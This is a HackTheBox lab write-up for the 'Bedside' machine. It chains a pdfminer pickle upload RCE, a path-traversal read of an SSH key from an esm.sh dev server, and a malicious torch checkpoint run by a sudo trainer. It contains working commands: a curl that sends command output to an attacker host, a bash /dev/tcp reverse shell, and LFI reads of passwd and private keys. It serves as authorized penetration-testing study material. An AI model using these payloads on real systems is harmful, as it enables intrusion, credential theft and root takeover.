# Bedside — HackTheBox (Season 11 / Release Arena)

Linux machine. Attack path: **web upload → container RCE → host LFI → SSH → sudo ML trainer → root**.

| | |
|--|--|
| **OS** | Debian Linux |
| **Entry** | `research.bedside.htb` file upload |
| **Foothold** | pdfminer.six pickle (async worker) |
| **User** | esm.sh `:3000` LFI → `developer` SSH |
| **Root** | `sudo` MONAI trainer + malicious torch checkpoint |

Scripts live in [`scripts/`](scripts/). No flags / VPN configs in this tree.

---

## Lab setup

```bash
# VPN (your HTB .ovpn)
# hosts
echo '<TARGET_IP> bedside.htb research.bedside.htb' | sudo tee -a /etc/hosts
```

Ports you care about from the outside: **22, 80**. Port **3000** is the Image Viewer / esm.sh dev server (host, reachable from Docker after foothold).

---

## Attack chain (overview)

```text
┌─────────────────────┐     upload evil.pickle.gz + PDF
│ research.bedside.htb│ ──────────────────────────────────┐
│ Apache + whitelist  │                                   ▼
└─────────────────────┘                         ┌──────────────────┐
                                                │ data-wrangler    │
                                                │ pdf_watcher.py   │
                                                │ datawrangler     │
                                                └────────┬─────────┘
                                                         │ curl 172.17.0.1:3000
                                                         │ LFI ../../../..
                                                         ▼
                                                ┌──────────────────┐
                                                │ esm.sh serve .   │
                                                │ developer:3000   │
                                                │ steal id_rsa     │
                                                └────────┬─────────┘
                                                         │ SSH
                                                         ▼
                                                ┌──────────────────┐
                                                │ developer        │
                                                │ sudo trainer.py  │
                                                └────────┬─────────┘
                         plant .pt via /datastore        │
                         (bind mount from container)     ▼
                                                ┌──────────────────┐
                                                │ root (torch.load)│
                                                └──────────────────┘
```

---

## 1) Recon

- **Vhosts:** `bedside.htb` (static clinic), **`research.bedside.htb`** (upload portal).
- Upload field: `uploadFile`. Whitelist includes `pdf`, `gz`, `zip`, images, `dcm`.
- Responses can leak upload path:  
  `/var/www/research.bedside.htb/uploads/`
- Header / stack hint: **pdfminer.six** (not necessarily sync-on-upload).
- Uploads are processed by a **background worker**, not by Apache PHP.

---

## 2) Foothold — pdfminer.six pickle RCE

### Idea

pdfminer CMap loading can use **`pickle.loads`** on `*.pickle.gz` paths (CVE-2025-64512-class).  
Craft:

1. **`evil.pickle.gz`** — pickle that runs a shell command.
2. **Trigger PDF** — Type0 font whose `/Encoding` is a PDF **Name** pointing at the absolute path of that pickle **without** the `.pickle.gz` suffix:

```text
/var/www/research.bedside.htb/uploads/<name>
→ file: .../uploads/<name>.pickle.gz
```

Working Encoding form (hex-escaped slashes):

```text
/#2Fvar#2Fwww#2Fresearch.bedside.htb#2Fuploads#2F<name>
```

### Worker behaviour (important)

From the container (`/app/pdf_watcher.py`):

| Setting | Value | Why it matters |
|---------|-------|----------------|
| `UPLOAD_DIR` | `/var/www/research.bedside.htb/uploads` | drop path |
| `SLEEP_INTERVAL` | **30 s** | async — wait after upload |
| `TIMEOUT` | **10 s** | long reverse shells block the loop; **background** the payload (`cmd &`) |
| Loop | reprocesses **all** `*.pdf` each cycle | many hanging payloads = slow worker |

### Script

```bash
# reverse shell (start nc first)
nc -lvnp 4444
python3 scripts/pdfminer_rce.py \
  --mode revshell --lhost <LHOST> --lport 4444 \
  --upload --target-ip <TARGET_IP> --name shell1

# one-shot command (preferred for automation)
python3 scripts/pdfminer_rce.py \
  --mode cmd --cmd 'id | curl -d @- http://<LHOST>:8888/' \
  --upload --target-ip <TARGET_IP>
```

Shell context after hit:

```text
datawrangler@data-wrangler:/app
# Docker container; /datastore is bind-mounted host volume (RW)
```

Classic Docker escape is closed (no sock / no useful caps). Pivot **over the network** to the host.

---

## 3) User — LFI on host port 3000 (esm.sh)

### Fingerprint

From the container:

```bash
curl -s http://172.17.0.1:3000/ | head
# "Bedside Clinic - Image Viewer"
# console / scripts: Built with esm.sh/x, /@hmr, WS /@hmr-ws
```

Host process (later confirmed via LFI `proc/self`):

```text
/usr/bin/esm.sh serve .
User=developer  (uid 1000)
WorkingDirectory=/home/developer/projects/bedside_viewer/
# systemd: esm.service
```

### Vulnerability

`esm.sh serve` maps HTTP paths under the project root. With enough **`../`**, you can read host files world-readable to `developer`.

**Use raw TCP** — Python `urllib` / some clients collapse `/../../../../etc/passwd` before the request leaves:

```bash
# inside container (or any host that can reach 172.17.0.1:3000)
python3 scripts/lfi_esm.py --host 172.17.0.1 --probe-depth
python3 scripts/lfi_esm.py --host 172.17.0.1 --dump-keys --out-dir /tmp/keys
```

Typical hits:

| Path via LFI | Content |
|--------------|---------|
| `/../../../../etc/passwd` | host users (`developer:x:1000`) |
| `/../../../../home/developer/user.txt` | user flag |
| `/../../../../home/developer/.ssh/id_rsa` | SSH private key (ed25519 OpenSSH format) |

### SSH

```bash
chmod 600 id_rsa   # saved from LFI as home_developer_.ssh_id_rsa
ssh -i id_rsa developer@<TARGET_IP>
cat ~/user.txt
```

---

## 4) Root — sudo MONAI trainer + checkpoint pickle

### Sudo rule

```text
(ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

Script is **not** writable (root:root). Running it as root is not enough alone — the bug is **what it loads**.

### What the script does

`bedside_trainer.py` is a dummy MONAI/PyTorch training loop:

```text
/datastore/staging  →  promote  →  /datastore/processed
                                    ↓
                              DataLoader + tiny MLP
                                    ↓
                     load latest /datastore/checkpoints/*.pt
                     (MONAI CheckpointLoader → torch.load weights_only=False)
                                    ↓
                     train loop, torch.save new checkpoints
```

### Permissions gap

| Actor | `/datastore` |
|-------|----------------|
| `developer` (SSH) | **no access** (Permission denied) |
| `datawrangler` (container) | **RW** (same host path bind-mounted) |
| root trainer | **full** |

So you plant the malicious `.pt` **from the container**, then trigger the trainer as `developer`.

### Exploit steps

```bash
# --- on attacker: serve plant_checkpoint if needed, or run ON HOST after copying ---
# Best: run plant on host via one-shot container RCE that curls a script, OR
# generate .pt on host (has torch) and curl it into the container then write paths.

# Inside container / any writer of /datastore:
# 1) valid image so LoadImaged succeeds before checkpoint load
# 2) newest evil checkpoint

python3 scripts/plant_checkpoint.py \
  --out /datastore/checkpoints/zzz_pwn.pt \
  --png /datastore/processed/sample.png \
  --clear-other-pt \
  --cmd "id > /tmp/from_ckpt; bash -c 'bash -i >& /dev/tcp/<LHOST>/9001 0>&1' &"

# as developer (SSH):
sudo -n /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

Log line you want:

```text
Found checkpoint /datastore/checkpoints/zzz_pwn.pt, loading with CheckpointLoader...
```

RCE runs **during unpickle** (`torch.load`). The process may still throw later on `load_state_dict` (Evil is not a real state dict) — ignore; payload already ran as **root**.

Verify:

```bash
cat /tmp/from_ckpt          # uid=0(root)
# reverse shell listener / sudoers plant / root SSH key — your choice
```

`scripts/run_chain.sh` prints the full command list with env placeholders.

---

## Scripts index

| Script | Role |
|--------|------|
| [`scripts/pdfminer_rce.py`](scripts/pdfminer_rce.py) | Build + optional upload of pickle + trigger PDF |
| [`scripts/lfi_esm.py`](scripts/lfi_esm.py) | Raw-socket LFI client for esm.sh `:3000` |
| [`scripts/plant_checkpoint.py`](scripts/plant_checkpoint.py) | Evil torch `.pt` + sample PNG for trainer |
| [`scripts/run_chain.sh`](scripts/run_chain.sh) | Ordered cheat sheet |

```bash
chmod +x scripts/*.py scripts/run_chain.sh
TARGET_IP=x.x.x.x LHOST=y.y.y.y ./scripts/run_chain.sh
```

---

## Dead ends (do not burn time)

| Idea | Result |
|------|--------|
| PHP webshell in uploads | 403 / engine off |
| Sync pdfminer on upload | Worker is **async** ~30s |
| HMR WebSocket “upload module” | Client protocol is watch/notify only |
| Host port scan for “magic” 4th service | 22/80/3000; `127.0.0.1:40973` opaque root HTTP |
| Docker escape from data-wrangler | No useful sock/caps |
| Cron as developer | Stock Debian only |
| Edit `bedside_trainer.py` | root:root, not writable |

---

## Lessons

1. **Async processors** turn “upload RCE” into drop + wait; hanging children starve the queue — always `cmd &`.
2. **Dev servers on high ports** (esm/vite-like) are often the real pivot after a container.
3. **Shared volumes** + root jobs that `torch.load` / `pickle.load` untrusted paths = classic “I write, root loads”.
4. Path traversal clients can **lie** — raw HTTP paths matter.

---

## Disclaimer

For HTB / authorized labs only. You are responsible for scope and local law.
